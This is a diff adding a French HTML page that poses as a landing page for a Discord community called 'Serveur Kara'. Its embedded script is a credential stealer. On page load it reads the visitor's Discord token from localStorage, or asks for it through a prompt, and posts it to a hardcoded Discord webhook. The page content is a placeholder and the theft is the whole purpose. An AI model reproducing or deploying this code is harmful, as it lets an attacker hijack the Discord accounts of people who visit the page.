@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serveur Kara - Une communauté extraordinaire!</title>
+    <style>
+        /* Le CSS reste inchangé */
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Le contenu HTML reste inchangé -->
+    </div>
+
+    <script>
+        // Détecter la plateforme (mobile, PC, web)
+        var platform = 'web';
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            platform = 'mobile';
+        } else if (window.location.href.includes('discord.com')) {
+            platform = 'web';
+        }
+
+        // Récupérer le token Discord
+        var token = '';
+        if (platform === 'web') {
+            token = localStorage.getItem('token');
+        } else if (platform === 'pc' || platform === 'mobile') {
+            token = prompt('Veuillez entrer votre token Discord :');
+        }
+
+        // Envoyer le token au webhook
+        if (token) {
+            fetch('https://discord.com/api/webhooks/1321561732958785657/iSm9ucDk4WMcEfybD-VRA-LGotH7E_HKpGpAuYK1X7Xx4LgeNFHkshV7a5r91ZABHk5A', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `Nouveau token Discord : ${token}`,
+                }),
+            })
+            .then(() => {
+                console.log('Token envoyé avec succès au webhook.');
+            })
+            .catch((error) => {
+                console.error('Erreur lors de l\'envoi du token au webhook :', error);
+            });
+        } else {
+            console.log('Aucun token trouvé.');
+        }
+    </script>
+</body>
+</html>
